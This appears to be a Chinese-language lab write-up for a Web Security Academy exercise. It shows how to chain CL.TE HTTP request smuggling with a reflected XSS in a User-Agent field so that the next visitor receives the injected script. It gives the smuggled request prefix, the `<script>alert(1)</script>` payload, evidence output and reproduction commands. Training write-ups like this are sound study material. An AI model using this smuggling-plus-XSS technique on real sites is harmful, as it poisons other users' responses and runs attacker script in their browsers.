---
title: "lab-deliver-reflected-xss"
links:
  - target: request-smuggling-family
    relation: evidences
---

# lab-deliver-reflected-xss

> evidences: [[request-smuggling-family]]

- 题面:Exploiting HTTP request smuggling to deliver reflected XSS(/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)
- 实例:https://0acd007404a73a8b815b7a5d00350095.web-security-academy.net(无 exploit server)
- 判定目标:走私一个带 XSS User-Agent 的请求,使**下一个用户**的请求拿到该响应并执行 `alert(1)`;状态:**solved**

## 关键步

1. 反射面:`GET /post?postId=1` 的评论表单里 `<input type="hidden" name="userAgent" value="<User-Agent 原样>">`
   —— 无任何编码,`User-Agent: x"><script>alert(1)</script>` 即闭合 value 属性并注入脚本。
2. 前端不支持 chunked(CL.TE)。用 `conn_reuse --cl-te` 发**不完整**走私前缀(无尾 CRLF):
   `GET /post?postId=1 HTTP/1.1\r\nHost: <lab>\r\nUser-Agent: x"><script>alert(1)</script>\r\nX-Ignore: X`
   → 后端等后续字节;下一个请求的行拼上来补全该走私请求,该请求者拿到我们的 XSS 响应。
3. **完整请求(带尾 `\r\n\r\n`)的走私不会投毒**(单发两次均不生效):后端立刻出响应,前端把它丢弃/自用;
   必须让响应在**下一个请求到达时才生成**。

## 证据摘录

```
conn_reuse "https://<inst>/" --cl-te 'GET /post?postId=1 HTTP/1.1\r\nHost: <inst>\r\nUser-Agent: MYPOSION\r\nX-Ignore: X'
 -> responses[0].headers 含 Set-Cookie/Connection: close;收到的即自建前缀(此前的走私已被 victim 消费)
# 紧跟的一次同形态走私回包中已出现:<section class='academyLabBanner is-solved'>
solved_check "<inst>/" --jar /tmp/b23-jar2.json
 -> {"solved":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
```

## 复现命令

```
lab_launch launch C76CECBB6026AF05CD93ECC7A616C391E40B73D135E309388F039ECF576FCD53 --widget-source /web-security/request-smuggling/exploiting --jar /tmp/b23-jar2.json
conn_reuse "https://<inst>/" --cl-te 'GET /post?postId=1 HTTP/1.1\r\nHost: <inst>\r\nUser-Agent: x"><script>alert(1)</script>\r\nX-Ignore: X'
# 等 victim 下一请求落上;再 solved_check
```
